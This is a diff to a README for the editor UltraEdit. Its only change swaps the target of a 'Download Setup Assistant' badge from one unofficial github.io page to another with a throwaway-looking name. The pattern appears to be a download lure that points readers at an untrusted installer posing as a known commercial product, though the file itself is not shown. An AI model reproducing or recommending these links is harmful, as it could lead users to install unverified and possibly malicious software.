@@ -1,6 +1,6 @@
 # UltraEdit 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/UltraEdit)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ultraedit-downloadtool.github.io/.github/)
 
 ---
 
